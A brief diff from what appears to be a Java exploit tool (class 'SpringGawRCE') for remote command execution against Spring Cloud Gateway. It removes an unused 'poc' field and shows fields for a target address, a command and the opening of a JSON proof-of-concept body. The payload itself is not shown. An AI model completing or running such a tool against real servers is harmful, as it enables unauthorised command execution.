@@ -15,7 +15,6 @@ import java.util.stream.Stream;
 public class SpringGawRCE {
     public String address;
     public String command;
-    public String poc;
     public String pocData =
                     "{\n" +
                     "  \"id\": \"poctest\",\n" +
